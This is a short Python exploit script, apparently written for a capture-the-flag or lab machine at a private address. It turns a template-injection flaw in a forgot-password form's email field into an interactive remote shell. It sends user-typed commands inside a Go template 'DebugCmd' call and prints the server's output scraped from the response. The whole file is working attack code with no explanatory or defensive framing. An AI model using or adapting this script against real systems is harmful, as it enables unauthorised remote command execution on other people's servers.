import requests
import re

url = 'http://10.10.11.113:8080/forgot/'

while True:
    try:
        debug = '{{.DebugCmd "'
        command = input("$> ")
        debug = debug + command + '"}}'
        data = {
            "email":debug
        }
        r = requests.post(url,data=data)
        output = r.text
        search = re.compile(r"Email Sent To: (.*?)\s+<button class", re.DOTALL) 
        result = search.search(output).group(1) 
        print(result)



    except KeyboardInterrupt:
        exit() 